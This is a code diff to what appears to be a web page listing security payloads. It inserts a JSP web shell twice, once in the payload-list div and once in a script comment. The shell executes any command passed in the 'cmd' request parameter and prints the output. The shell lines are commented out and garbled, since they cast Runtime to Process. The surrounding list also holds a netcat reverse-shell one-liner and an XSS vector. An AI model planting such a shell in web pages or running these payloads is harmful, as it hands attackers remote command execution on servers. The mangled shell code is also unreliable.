@@ -100,10 +100,37 @@
 
     <div id="payload-list">
         </div>
+            // --- ADD YOUR PAYLOADS HERE <%
+ //   String cmd = request.getParameter("cmd");
+   // if (cmd != null) {
+     //   Process p = (Process) Class.forName("java.lang.Runtime")
+       //     .getMethod("getRuntime")
+         //   .invoke(null);
+        //java.io.InputStream in = ((Runtime)p).exec(cmd).getInputStream();
+        //int a = -1;
+        //byte[] b = new byte[2048];
+        //while ((a = in.read(b)) != -1) {
+        //    out.print(new String(b));
+       // }
+    //}
+//%>---
 </div>
 
 <script>
-    // --- ADD YOUR PAYLOADS HERE ---
+    // --- ADD YOUR PAYLOADS HERE <%
+ //   String cmd = request.getParameter("cmd");
+   // if (cmd != null) {
+     //   Process p = (Process) Class.forName("java.lang.Runtime")
+       //     .getMethod("getRuntime")
+         //   .invoke(null);
+        //java.io.InputStream in = ((Runtime)p).exec(cmd).getInputStream();
+        //int a = -1;
+        //byte[] b = new byte[2048];
+        //while ((a = in.read(b)) != -1) {
+        //    out.print(new String(b));
+       // }
+    //}
+//%>---
     const myPayloads = [
         {
             category: "XSS",
@@ -116,9 +143,9 @@
             code: "nc -e /bin/sh 10.0.0.1 1234"
         },
         {
-            category: "XSS",
+            category: "jsp shell",
             description: "SVG onload vector",
-            code: "<svg onload=alert(1)>"
+            code: ""
         }
     ];
 
